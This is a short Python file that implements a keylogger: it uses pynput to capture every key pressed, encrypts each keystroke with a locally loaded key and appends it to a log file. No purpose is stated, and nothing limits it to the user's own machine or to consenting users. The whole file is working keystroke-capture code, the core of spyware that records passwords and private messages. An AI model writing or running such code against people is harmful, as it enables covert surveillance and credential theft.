from pynput import keyboard
from encryption import encrypt_data, load_key

key = load_key()
LOG_FILE = "logs/keystrokes.log"

def on_press(key_data):
    try:
        text = key_data.char
    except AttributeError:
        text = f"[{key_data.name}]"

    encrypted = encrypt_data(text, key)
    with open(LOG_FILE, "a") as f:
        f.write(encrypted + "\n")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

